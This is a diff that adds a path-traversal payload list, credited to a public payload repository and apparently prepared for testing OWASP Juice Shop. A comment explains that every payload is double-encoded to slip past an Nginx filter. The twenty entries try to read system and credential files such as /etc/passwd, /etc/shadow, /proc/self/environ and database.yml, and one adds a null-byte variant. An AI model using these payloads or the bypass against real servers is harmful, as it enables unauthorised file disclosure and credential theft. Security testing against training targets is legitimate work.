@@ -1,0 +1,24 @@
+# Source: https://github.com/payloadbox/path-traversal-payload-list
+# Note: Nginx returns 400 on plain "../" and single-encoded "..%2F" before
+# it reads our client-IP header, so every payload below uses the
+# double-encoded form ("..%252F"), which reaches Juice Shop intact.
+..%252F..%252Fetc%252Fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+..%252F..%252Fetc%252Fshadow
+..%252F..%252F..%252Fetc%252Fshadow
+..%252F..%252Fwin.ini
+..%252F..%252F..%252Fwin.ini
+..%252F..%252Fboot.ini
+..%252F..%252Fwindows%252Fwin.ini
+..%252F..%252Fetc%252Fhosts
+..%252F..%252Fetc%252Fgroup
+..%252F..%252Fetc%252Fhostname
+..%252F..%252Fproc%252Fself%252Fenviron
+..%252F..%252F..%252Fetc%252Fpasswd%2500
+..%252Fconfig%252Fdatabase.yml
+..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+..%252Fetc%252Fpasswd
+..%255c..%255cwindows%255cwin.ini
+..%255c..%255c..%255cwindows%255csystem.ini
+..%252F..%252F..%252Fvar%252Flog%252Fauth.log
